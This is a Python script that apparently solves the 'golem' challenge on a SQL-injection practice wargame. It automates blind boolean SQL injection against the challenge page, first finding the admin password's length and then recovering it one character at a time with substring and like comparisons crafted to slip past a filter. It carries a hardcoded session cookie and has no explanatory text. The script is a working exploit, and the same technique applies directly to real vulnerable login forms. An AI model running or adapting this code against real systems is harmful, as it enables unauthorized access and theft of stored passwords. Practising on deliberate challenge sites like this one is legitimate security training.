import requests
import string

url = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php"
cookie = {'PHPSESSID': 'jett8kmnsi97cl8bu5naomvbdm'}

def pw_len():
    for pw_length in range(50):
        param = {"pw":"'||id<0x67&&length(pw)>{} #".format(pw_length)}
        req = requests.get(url, params=param, cookies=cookie)

        if "Hello admin" not in req.text:
            print("length:", pw_length)
            return pw_length

def pw_find():
    length = int(pw_len())
    password = ""
    for i in range(length):
        for value in string.printable:
            param = {"pw":"'||id<0x67&&substring(pw,{},1)like('{}') #".format(i+1, value)}
            print(param)
            req = requests.get(url, params=param, cookies=cookie)
            if "Hello admin" in req.text:
                password += value
                break
    print("Password:", password)

pw_find()

#77d6290b